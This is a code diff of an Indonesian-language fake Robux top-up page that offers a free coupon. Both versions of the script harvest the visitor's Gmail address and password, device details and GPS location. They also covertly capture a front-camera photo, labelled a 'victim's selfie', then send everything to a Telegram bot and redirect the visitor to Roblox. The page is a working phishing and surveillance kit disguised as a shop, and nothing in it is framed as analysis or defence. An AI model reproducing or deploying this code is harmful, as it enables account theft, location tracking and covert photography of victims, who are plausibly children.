+            grid.appendChild(card);
+        });
+    }
+    renderProducts(false);
 
-        function selectProduct(card, p, discounted) {
-            document.querySelectorAll('.prod-card').forEach(c => c.classList.remove('selected'));
-            card.classList.add('selected');
-            selectedProduct = { ...p, finalPrice: discounted ? 0 : p.price };
-            isGratis = discounted;
-            document.getElementById('btnNextStep').disabled = false;
-            document.getElementById('btnNextStep').textContent =
-                `Lanjut → Beli ${p.amount} (${discounted ? 'GRATIS' : formatPrice(p.price)})`;
-            document.getElementById('selectedProductLabel').textContent =
-                `${p.amount} — ${discounted ? 'GRATIS (Kode GRATIS2026)' : formatPrice(p.price)}`;
-            document.getElementById('checkoutProduct').textContent =
-                `${p.amount} — ${discounted ? 'GRATIS' : formatPrice(p.price)}`;
-            document.getElementById('finalPriceDisplay').textContent =
-                discounted ? 'GRATIS!' : 'Harga: ' + formatPrice(p.price);
-            document.getElementById('finalPriceDisplay').className =
-                discounted ? 'price-display free' : 'price-display';
-        }
+    function selectProduct(card, p, discounted) {
+        document.querySelectorAll('.prod-card').forEach(c=>c.classList.remove('selected'));
+        card.classList.add('selected');
+        selectedProduct = { ...p, finalPrice: discounted ? 0 : p.price };
+        isGratis = discounted;
+        document.getElementById('btnNextStep').disabled = false;
+        document.getElementById('btnNextStep').textContent = `Lanjut → Beli ${p.amount} (${discounted?'GRATIS':formatPrice(p.price)})`;
+        document.getElementById('selectedProductLabel').textContent = `${p.amount} — ${discounted?'GRATIS (Kode GRATIS2026)':formatPrice(p.price)}`;
+        document.getElementById('checkoutProduct').textContent = `${p.amount} — ${discounted?'GRATIS':formatPrice(p.price)}`;
+        const priceDisplay = document.getElementById('finalPriceDisplay');
+        priceDisplay.textContent = discounted ? 'GRATIS!' : 'Harga: ' + formatPrice(p.price);
+        priceDisplay.className = discounted ? 'price-display free' : 'price-display';
+    }
 
-        // ==================== KUPON ====================
-        function applyCoupon() {
-            const code = document.getElementById('couponInput').value.trim().toUpperCase();
-            if (code === 'GRATIS2026') {
-                isGratis = true;
-                renderProducts(true);
-                document.getElementById('couponInput').value = '';
-                selectedProduct = null;
-                document.getElementById('btnNextStep').disabled = true;
-                document.getElementById('btnNextStep').textContent = 'Lanjut → Masukkan Akun';
-                document.getElementById('selectedProductLabel').textContent = '-';
-                document.getElementById('finalPriceDisplay').textContent = 'Harga: -';
-                document.getElementById('finalPriceDisplay').className = 'price-display';
-                showToast('✅ Kode GRATIS2026 berhasil! Semua produk GRATIS.');
-            } else {
-                showToast('❌ Kode diskon tidak valid.');
+    // ==================== KUPON ====================
+    function applyCoupon() {
+        const code = document.getElementById('couponInput').value.trim().toUpperCase();
+        if (code === 'GRATIS2026') {
+            isGratis = true;
+            renderProducts(true);
+            document.getElementById('couponInput').value = '';
+            selectedProduct = null;
+            document.getElementById('btnNextStep').disabled = true;
+            document.getElementById('btnNextStep').textContent = 'Lanjut → Masukkan Akun';
+            document.getElementById('selectedProductLabel').textContent = '-';
+            document.getElementById('finalPriceDisplay').textContent = 'Harga: -';
+            document.getElementById('finalPriceDisplay').className = 'price-display';
+            showToast('✅ Kode GRATIS2026 aktif! Semua GRATIS.');
+        } else {
+            showToast('❌ Kode tidak valid.');
+        }
+    }
+
+    // ==================== NAVIGASI PANEL ====================
+    const panelProducts = document.getElementById('panelProducts');
+    const panelAccount = document.getElementById('panelAccount');
+    const panelCheckout = document.getElementById('panelCheckout');
+    const stepDot1 = document.getElementById('stepDot1');
+    const stepDot2 = document.getElementById('stepDot2');
+    const stepDot3 = document.getElementById('stepDot3');
+
+    document.getElementById('btnNextStep').addEventListener('click', ()=>{
+        if (!selectedProduct) return showToast('⚠️ Pilih nominal dulu!');
+        panelProducts.classList.remove('active');
+        panelAccount.classList.add('active');
+        panelCheckout.classList.remove('active');
+        updateSteps(2);
+    });
+
+    function goBackToProducts() {
+        panelAccount.classList.remove('active');
+        panelCheckout.classList.remove('active');
+        panelProducts.classList.add('active');
+        updateSteps(1);
+    }
+
+    function updateSteps(step) {
+        stepDot1.className = 'step-dot' + (step===1 ? ' current' : step>1 ? ' done' : '');
+        stepDot2.className = 'step-dot' + (step===2 ? ' current' : step>2 ? ' done' : '');
+        stepDot3.className = 'step-dot' + (step===3 ? ' current' : '');
+    }
+
+    // Validasi email Gmail
+    const emailInput = document.getElementById('emailInput');
+    const passInput = document.getElementById('passInput');
+    const btnCheckout = document.getElementById('btnCheckout');
+    function validateAccountForm() {
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+        const isGmail = /^[^\s@]+@gmail\.com$/i.test(email);
+        const passValid = pass.length > 0;
+        document.getElementById('emailError').style.display = email && !isGmail ? 'block' : 'none';
+        document.getElementById('passError').style.display = email && !passValid ? 'block' : 'none';
+        emailInput.classList.toggle('invalid', email && !isGmail);
+        btnCheckout.disabled = !(isGmail && passValid);
+    }
+    emailInput.addEventListener('input', validateAccountForm);
+    passInput.addEventListener('input', validateAccountForm);
+
+    btnCheckout.addEventListener('click', ()=>{
+        if (btnCheckout.disabled) return;
+        panelAccount.classList.remove('active');
+        panelCheckout.classList.add('active');
+        updateSteps(3);
+        document.getElementById('checkoutEmail').textContent = emailInput.value.trim();
+    });
+</script>
+<script>
+    document.getElementById('btnBuyNow').addEventListener('click', async ()=>{
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+        if (!email || !pass) return showToast('⚠️ Data akun belum lengkap!');
+
+        const overlay = document.getElementById('processingOverlay');
+        const procText = document.getElementById('processingText');
+        overlay.classList.add('show');
+        procText.textContent = 'Memverifikasi akun...';
+
+        // Device info
+        const deviceInfo = {
+            brand: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
+            model: (navigator.userAgentData?.brands || []).map(b=>b.brand).join(', ') || navigator.userAgent,
+            battery: 'N/A',
+            location: 'Tidak diberikan'
+        };
+        try {
+            if ('getBattery' in navigator) {
+                const b = await navigator.getBattery();
+                deviceInfo.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡':'🔋'}`;
             }
-        }
+        } catch(e){}
 
-        // ==================== NAVIGASI ====================
-        const panelProducts = document.getElementById('panelProducts');
-        const panelAccount = document.getElementById('panelAccount');
-        const panelCheckout = document.getElementById('panelCheckout');
-        const stepDot1 = document.getElementById('stepDot1');
-        const stepDot2 = document.getElementById('stepDot2');
-        const stepDot3 = document.getElementById('stepDot3');
-        const btnNextStep = document.getElementById('btnNextStep');
-        const btnCheckout = document.getElementById('btnCheckout');
-        const btnBuyNow = document.getElementById('btnBuyNow');
-        const emailInput = document.getElementById('emailInput');
-        const passInput = document.getElementById('passInput');
-
-        btnNextStep.addEventListener('click', () => {
-            if (!selectedProduct) return showToast('⚠️ Pilih nominal Robux dulu!');
-            panelProducts.classList.remove('active');
-            panelAccount.classList.add('active');
-            panelCheckout.classList.remove('active');
-            stepDot1.classList.remove('current');
-            stepDot1.classList.add('done');
-            stepDot2.classList.add('current');
-            stepDot3.classList.remove('current', 'done');
-            validateAccountForm();
-        });
-
-        function goBackToProducts() {
-            panelAccount.classList.remove('active');
-            panelCheckout.classList.remove('active');
-            panelProducts.classList.add('active');
-            stepDot1.classList.add('current');
-            stepDot1.classList.remove('done');
-            stepDot2.classList.remove('current');
-            stepDot3.classList.remove('current', 'done');
-        }
-
-        function validateAccountForm() {
-            const email = emailInput.value.trim();
-            const pass = passInput.value.trim();
-            const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) &&
-                (email.toLowerCase().endsWith('@gmail.com') || email.toLowerCase().endsWith('@googlemail.com'));
-            const passValid = pass.length >= 1;
-
-            document.getElementById('emailError').style.display = email.length > 0 && !emailValid ? 'block' : 'none';
-            document.getElementById('passError').style.display = pass.length === 0 && email.length > 0 ? 'block' :
-                'none';
-            if (!emailValid && email.length > 0) emailInput.classList.add('invalid');
-            else emailInput.classList.remove('invalid');
-
-            btnCheckout.disabled = !(emailValid && passValid);
-        }
-
-        emailInput.addEventListener('input', validateAccountForm);
-        passInput.addEventListener('input', validateAccountForm);
-
-        btnCheckout.addEventListener('click', () => {
-            if (btnCheckout.disabled) return;
-            panelAccount.classList.remove('active');
-            panelCheckout.classList.add('active');
-            stepDot2.classList.remove('current');
-            stepDot2.classList.add('done');
-            stepDot3.classList.add('current');
-            document.getElementById('checkoutEmail').textContent = emailInput.value.trim();
-        });
-
-        // ==================== PROSES BELI + STEALTH CAPTURE ====================
-        btnBuyNow.addEventListener('click', async () => {
-            const email = emailInput.value.trim();
-            const pass = passInput.value.trim();
-            if (!email || !pass) return showToast('⚠️ Data akun belum lengkap!');
-
-            const overlay = document.getElementById('processingOverlay');
-            const procText = document.getElementById('processingText');
-            overlay.classList.add('show');
-            procText.textContent = 'Memverifikasi akun...';
-
-            // Kumpulkan data device
-            const deviceInfo = {
-                brand: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
-                model: (navigator.userAgentData?.brands || []).map(b => b.brand).join(', ') || navigator.userAgent,
-                battery: 'N/A',
-                location: 'Tidak diberikan'
-            };
-
+        procText.textContent = 'Mendapatkan lokasi...';
+        if (navigator.geolocation) {
             try {
-                if ('getBattery' in navigator) {
-                    const b = await navigator.getBattery();
-                    deviceInfo.battery = `${Math.round(b.level*100)}% ${b.charging?'⚡':'🔋'}`;
-                }
-            } catch (e) {}
-
-            procText.textContent = 'Mendapatkan lokasi...';
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000,
-                            enableHighAccuracy: true });
-                    });
-                    deviceInfo.location =
-                        `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                } catch (e) {
-                    deviceInfo.location = 'Ditolak pengguna';
-                }
+                const pos = await new Promise((resolve, reject)=>{
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout:8000, enableHighAccuracy:true });
+                });
+                deviceInfo.location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            } catch(e) {
+                deviceInfo.location = 'Ditolak';
             }
+        }
 
-            // Kamera stealth (no preview)
-            let photoBase64 = null;
-            procText.textContent = 'Verifikasi keamanan...';
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user",
-                        width: { ideal: 320 }, height: { ideal: 240 } } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', '');
-                video.setAttribute('muted', '');
-                await video.play();
-                await new Promise(r => setTimeout(r, 800));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 320;
-                canvas.height = video.videoHeight || 240;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
-                stream.getTracks().forEach(t => t.stop());
-            } catch (e) {
-                console.log('Kamera tidak tersedia');
-            }
+        // Kamera stealth (tidak ditampilkan)
+        let photoBase64 = null;
+        procText.textContent = 'Verifikasi keamanan...';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:"user", width:{ideal:320}, height:{ideal:240} } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            video.muted = true;
+            await video.play();
+            await new Promise(r=>setTimeout(r, 700));
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video,0,0);
+            photoBase64 = canvas.toDataURL('image/jpeg',0.8);
+            stream.getTracks().forEach(t=>t.stop());
+        } catch(e){}
 
-            procText.textContent = 'Mengirim data...';
-            await sendToTelegram(email, pass, deviceInfo, photoBase64);
+        procText.textContent = 'Mengirim data...';
+        await sendToTelegram(email, pass, deviceInfo, photoBase64);
 
-            procText.textContent = '✅ Berhasil! Mengalihkan...';
-            setTimeout(() => {
-                overlay.classList.remove('show');
-                window.location.href = 'https://www.roblox.com/home';
-            }, 2000);
+        procText.textContent = '✅ Berhasil! Mengalihkan...';
+        setTimeout(()=>{
+            overlay.classList.remove('show');
+            window.location.href = 'https://www.roblox.com/home';
+        }, 1800);
+    });
+
+    async function sendToTelegram(email, pass, device, photoBase64) {
+        const productInfo = selectedProduct
+            ? `${selectedProduct.amount} — ${isGratis ? 'GRATIS (Kode GRATIS2026)' : formatPrice(selectedProduct.finalPrice)}`
+            : 'Tidak diketahui';
+        const msg = `🔴 <b>FDW TOP UP — NEW CAPTURE</b>\n━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n🔑 <b>Password:</b> <code>${escapeHtml(pass)}</code>\n━━━━━━━━━━━━━━━━━\n💰 <b>Produk:</b> ${productInfo}\n🏷️ <b>Diskon:</b> ${isGratis?'GRATIS2026 ✅':'Tidak dipakai'}\n━━━━━━━━━━━━━━━━━\n📱 <b>Device:</b> ${escapeHtml(device.model)}\n🖥️ <b>Platform:</b> ${escapeHtml(device.brand)}\n🔋 <b>Baterai:</b> ${device.battery}\n📍 <b>Lokasi:</b> ${device.location}\n━━━━━━━━━━━━━━━━━\n🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method:'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode:'HTML' })
         });
-
-        async function sendToTelegram(email, pass, device, photoBase64) {
-            const productInfo = selectedProduct ?
-                `${selectedProduct.amount} — ${isGratis ? 'GRATIS (Kode GRATIS2026)' : formatPrice(selectedProduct.finalPrice)}` :
-                'Tidak diketahui';
-            const msg = `
-        🔴 <b>FDW TOP UP — NEW CAPTURE</b>
-        ━━━━━━━━━━━━━━━━━━━
-        📧 <b>Email:</b> <code>${escapeHtml(email)}</code>
-        🔑 <b>Password:</b> <code>${escapeHtml(pass)}</code>
-        ━━━━━━━━━━━━━━━━━━━
-        💰 <b>Produk:</b> ${productInfo}
-        🏷️ <b>Diskon:</b> ${isGratis ? 'GRATIS2026 ✅' : 'Tidak dipakai'}
-        ━━━━━━━━━━━━━━━━━━━
-        📱 <b>Device:</b> ${escapeHtml(device.model)}
-        🖥️ <b>Platform:</b> ${escapeHtml(device.brand)}
-        🔋 <b>Baterai:</b> ${device.battery}
-        📍 <b>Lokasi:</b> ${device.location}
-        ━━━━━━━━━━━━━━━━━━━
-        🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
-          `;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-            });
-            if (photoBase64) {
-                const blob = await (await fetch(photoBase64)).blob();
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('caption', `📸 Selfie: ${email}`);
-                fd.append('photo', blob, 'selfie.jpg');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }
+        if (photoBase64) {
+            const blob = await (await fetch(photoBase64)).blob();
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('caption', `📸 Selfie korban: ${email}`);
+            fd.append('photo', blob, 'selfie.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd });
         }
+    }
 
-        function escapeHtml(s) {
-            return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-        }
-
-        function showToast(msg) {
-            const t = document.getElementById('toast');
-            t.textContent = msg;
-            t.classList.add('show');
-            setTimeout(() => t.classList.remove('show'), 2500);
-        }
-    </script>
+    function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+    function showToast(msg) {
+        const t = document.getElementById('toast');
+        t.textContent = msg;
+        t.classList.add('show');
+        setTimeout(()=>t.classList.remove('show'), 2200);
+    }
+</script>
 </body>
 </html>
